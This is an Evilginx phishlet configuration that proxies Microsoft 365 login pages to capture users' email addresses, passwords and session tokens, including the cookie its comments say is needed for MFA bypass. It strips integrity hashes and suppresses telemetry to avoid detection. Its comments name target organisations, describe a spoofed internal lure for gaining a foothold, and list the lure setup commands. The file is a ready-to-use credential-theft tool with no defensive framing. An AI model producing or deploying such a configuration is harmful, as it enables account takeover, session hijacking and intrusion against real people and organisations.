author: 'Whispergate'
min_ver: '2.3.0'
# Target  : https://login.microsoftonline.com  (Microsoft 365 / Entra ID)
# Captures: UPN (email) + password submitted as JSON to /common/login
#           ESTSAUTH + ESTSAUTHPERSISTENT — primary session tokens
#           SignInStateCookie — MFA state cookie (required for MFA bypass)
#
# Use case: Sterling Bridge and Atlas both use M365. A convincing O365 lure
# sent from a spoofed internal address captures credentials that may also
# unlock VPN, email, and SharePoint — broadening the initial foothold.
#
# Evilginx setup:
#   : phishlets hostname o365 <your-phish-domain>
#   : phishlets enable o365
#   : lures create o365
#   : lures edit <id> redirect_url https://portal.office.com
#   : lures get-url <id>

proxy_hosts:
  - {phish_sub: 'login',  orig_sub: 'login',  domain: 'microsoftonline.com', session: true,  is_landing: true,  auto_filter: true}
  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net',          session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'sso',    orig_sub: '',        domain: 'msftauth.net',        session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Remove SRI hashes — content is rewritten by the proxy so hashes will not match
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity="sha256-[^"]*"', replace: '', mimes: ['text/html']}
  # Rewrite the canary telemetry domain so it doesn't leak the real origin
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"telemetryEndpoint":"https://[^"]*"', replace: '"telemetryEndpoint":""', mimes: ['application/json', 'application/javascript']}

auth_tokens:
  - domain: '.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'fpc']
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'brcap', 'ch']

# Credentials are submitted as JSON body (not a standard HTML form)
credentials:
  username:
    key: ''
    search: '"login":"([^"]*)'
    type: 'json'
  password:
    key: ''
    search: '"passwd":"([^"]*)'
    type: 'json'

login:
  domain: 'login.microsoftonline.com'
  path: '/'
